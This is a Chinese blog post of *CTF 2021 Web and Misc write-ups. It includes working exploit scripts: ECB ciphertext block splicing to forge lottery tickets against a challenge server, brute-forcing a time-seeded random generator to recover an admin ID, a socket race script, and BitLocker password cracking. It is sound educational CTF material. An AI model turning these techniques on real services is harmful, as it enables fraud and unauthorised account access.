---
layout: post
title:  "[*CTF]WriteUp汇总(Web, Misc)"
date:   2021-01-20 12:00:00 +0800
categories: [ctf, WriteUp]
---

# WEB

## oh-my-bet

wp搜集中，之后补上

## lottery again

ecb模式，按块加密，每块密钥相同，密文按块直接与明文对应，所以我们可以控制明密文对重放攻击。

对于一个enc，长106字节，如下

{"lottery":"48e51545-cfd3-4d2e-8ea4-851c945b5faf","user":"0123ff93-c230-49b9-b078-5d205247c5a8","coin":81}

本题使用的是MCRYPT_RIJNDAEL_256加密，rijndael128与aes相同，都是以128位为一个块加密，rijndael256则是以256位为一个块，即32字节。

思路就是通过重放，将多个彩票不同块进行拼接，使得同一个user可以对应多个lottery。

因为每块是32字节对应切割位点如下：

{"lottery":"48e51545-cfd3-4d2e-8|ea4-851c945b5faf","user":"0123ff|93-c230-49b9-b078-5d205247c5a8",|"coin":81}

最后一块不足32字节自动填充。

可以看到我们无论替换哪一个块都不能完整控制lottery或者user，替换前两块的成功的前提是另一个enc的user前6字节也是0123ff，碰撞概率较小。

但是我们可以将第一个enc的前1，2块拼接上第二个enc的2，3，4块，形成如下类似的格式

{"lottery":"48e51545-cfd3-4d2e-8ea4-851c945b5faf","user":"0123ffb0e-b15c9de5afaa","user":"8dfd276a-ee65-4563-af33-c1ae7c577322","coin":88}

当json_decode之后后面的user会覆盖前面的，就成功控制user不变，lottery一直在变了。

**脚本如下**

```python
import requests
import random
import string
import json
import base64
from urllib.parse import quote
user_token = "1slT9Xb1TxoDtEtxKZ2k0n8c9T3lZttY"
user_uuid = "fadf5f40-9fe1-4a57-8d5b-06f16584298b"
user_enc = b"8mKK4YdL0VHw67+rtMCBv+z9SX4yB7SwYWlL2A3VPqXXFHIpf1XGIVDHNxW5td/3fyYbEEEBv43419eYjQAwd9thL1nc+6OWy2UDfXdG+INLgbXDkV8kaRNGurSbXtf5XUzAgdeXmksz508IscL5BqiGkpqPuH/4Qa5qAiM0/hU="
cookie = {
  "api_token": user_token
}
url = "http://52.149.144.45:8080"
def get_random():
  return ''.join(random.sample(string.ascii_letters + string.digits, 10))
def register():
  username=get_random()
  data= {
      "username": username,
      "password": "asdasd"
  }
  res = requests.post(url + "/user/register",data=data)
  d = json.loads(res.text)

  return username
def login(username, password="asdasd"):
  data = {
    "username": username,
    "password": password
  }
  res = requests.post(url + "/user/login",data=data)
  d = json.loads(res.text)
  return d['user']['api_token']
def info(api_token):
  res = requests.get(url + "/user/info?api_token=" + api_token)
  d = json.loads(res.text)
  print('uuid: '+d['user']['uuid'])
def buy(api_key):
  data = {
    "api_token": api_key
  }
  res = requests.post(url + "/lottery/buy",data=data)
  *#print(res.text)*
  d = json.loads(res.text)
  return d['enc']
def get_enc(enc):
  o = base64.b64decode(enc)
  u = base64.b64decode(user_enc)
  m = base64.b64encode(o[:64] + u[32:])
  print('enc: ', end='')
  print(quote(m))
  return m
def charge(enc):
  data = {
    "user": user_uuid,
    "enc": enc,
    "coin": "7"
  }
  res = requests.post(url + "/lottery/charge", data=data, cookies=cookie)
  print("charge: ", end='')
  print(res.content)
if __name__ == "__main__":
  while True:
    username = register()
    api_token = login(username)
    enc = buy(api_token)
    info(api_token)
    mo_enc = get_enc(enc)
    charge(mo_enc)
```

## oh-my-note

用户不存在时会创建用户，并同时新建note

![](..\images\starctf_xmaq-01.png)

note id和user_id随机种子不同，但是note_id的种子使用了user_id

虽然对于时间戳我们只能知道分钟级别的，但是题目只精确到了四位，再算上60秒只需爆破60*10000次就能算出user_id，注时区不同所以在本地使用time.strptime得加8个小时。。。

```python
import random
import datetime
import time
import string
def get_random_id():
    alphabet = list(string.ascii_lowercase + string.digits)
    return ''.join([random.choice(alphabet) for _ in range(32)])
post_at = '2021-01-15 02:29 UTC'
l = [i/10000 for i in range(0, 10000)]
for j in range(0,60):
    ta1 = time.strptime('2021-01-15 10:29:{} UTC'.format(j), '%Y-%m-%d %H:%M:%S UTC')
    ta = int(time.mktime(ta1))
    for i in l:
        t = ta + i
        random.seed(t)
        u_id = get_random_id()
        random.seed(u_id + post_at)
        p_id = get_random_id()
        if p_id == 'lj40n2p9qj9xkzy3zfzz7pucm6dmjg1u':
            print(u_id)
        
        if(i*10000 % 8999 == 0):
            print(i, t)
```

算出admin的user_id就能看到它发布的私有的flag

## oh-my-socket

不知道是不是非预期，webserver有root权限任意命令执行，client有任意文件读，看了一下没啥用

给了源码

`server\server\oh-some-funny-code`里是flag

`server\server\server.py`大致功能为：

- 接受一个TCP连接，多了就`time.sleep(120)`然后close
- 如果接收到`*ctf`就返回`oh-some-funny-code`的内容
- 否则返回当前日期

但是`client\client\client.py`也会持续连接server，所以要利用docker重启client和server的时间差去send`*ctf`

本地尝试：

![](..\images\starctf_xmaq-02.png)

![](..\images\starctf_xmaq-03.png)

远程5个端口一直都有个`solve.py`或者其他脚本在循环上传连接server，做出来的选手在搅屎增大了每两分钟一次机会的利用难度

运气好手动试了几下就出了：

```python
#!/usr/bin/python*
from socket import *
HOST = '172.21.0.2'
PORT = 21587
BUFSIZ = 1024
ADDR = (HOST, PORT)
tcpCliSock = socket(AF_INET, SOCK_STREAM)
tcpCliSock.connect(ADDR)
try:
  data = b'*ctf'
  tcpCliSock.send(data)
  data = tcpCliSock.recv(BUFSIZ)
  print(data)
except Exception as e:
  tcpCliSock.close()
  print("ERROR", e)
```

![](..\images\starctf_xmaq-04.png)

或者bp卡着点循环重放：

![](..\images\starctf_xmaq-05.png)

```
 *ctf{ohhh_just_other_web_s111de_channel}
```

# Misc

## little trick

下载之后是一个bitlocker加密的硬盘镜像

利用 bitlocker password 对密码进行爆破，由于试用版只显示密码位数，不显示具体密码，所以在他的词典里面手动二分查找，最终获得密码12345678

用取证大师打开镜像，在回收站记录看到这个，恢复出来

![](..\images\starctf_xmaq-07.png)

RS7GUZ6.pdf

使 用苹果系列的任何一款设备打开都是下面这个效果

![](..\images\starctf_xmaq-08.png)

## MineGame

可以使用CE使得程序的计时器停止，并且在CE暂停期间是可以对程序进行点击的，取消暂停之后可以看到点击结果，这样对于手速的要求就大大降低了，然后就可以好好玩扫雷了

![](..\images\starctf_xmaq-09.png)

## puzzle

gaps尝试了一下，发现拼不出来

google了一下原图，想到DDCTF的拼图技巧，把给的图片切片一下和原图进行对比

![](..\images\starctf_xmaq-10.webp)

上次DDCTF的脚本利用一下

```python
import cv2
from PIL import Image
import numpy as np
import os
import shutil
import threading
*# 读取目标图片*
source = cv2.imread(r"C:\Users\LEOGG\Desktop\wallpaper.jpg")
*# 拼接结果*
target = Image.fromarray(np.zeros(source.shape, np.uint8))
*# 图库目录*
dirs_path = r"C:\Users\LEOGG\Desktop\test\test"
*# 差异图片存放目录*
dst_path = r"C:\Users\LEOGG\Desktop\dd\diff"
def match(temp_file):
  *# 读取模板图片*
  template = cv2.imread(temp_file)
  *# 获得模板图片的高宽尺寸*
  theight, twidth = template.shape[:2]
  *# 执行模板匹配，采用的匹配方式cv2.TM_SQDIFF_NORMED*
  result = cv2.matchTemplate(source, template, cv2.TM_SQDIFF_NORMED)
  *# 归一化处理*
  cv2.normalize(result, result, 0, 1, cv2.NORM_MINMAX, -1)
  *# 寻找矩阵（一维数组当做向量，用Mat定义）中的最大值和最小值的匹配结果及其位置*
  min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(result)
  target.paste(Image.fromarray(template), min_loc)
  return abs(min_val)
class MThread(threading.Thread):
  def __init__(self, file_name):
    threading.Thread.__init__(self)
    self.file_name = file_name
  def run(self):
    real_path = os.path.join(dirs_path, k)
    rect = match(real_path)
    if rect > 6e-10:
      print(rect)
      shutil.copy(real_path, dst_path)
count = 0
dirs = os.listdir(dirs_path)
threads = []
for k in dirs:
  if k.endswith('jpg'):
    count += 1
    print("processing on pic" + str(count))
    mt = MThread(k)
    mt.start()
    threads.append(mt)
  else:
    continue
*# 等待所有线程完成*
for t in threads:
  t.join()
target.show()
target.save(r"C:\Users\LEOGG\Desktop\dd.jpg")
```

![](..\images\starctf_xmaq-11.webp)

flag{you_can_never_finish_the}

## chess

4D象棋，wp搜到之后补上







**wp资料来自：**

	[星盟安全]: http://snowywar.top/wordpress/index.php/2021/01/18/ctf2020-writeup/

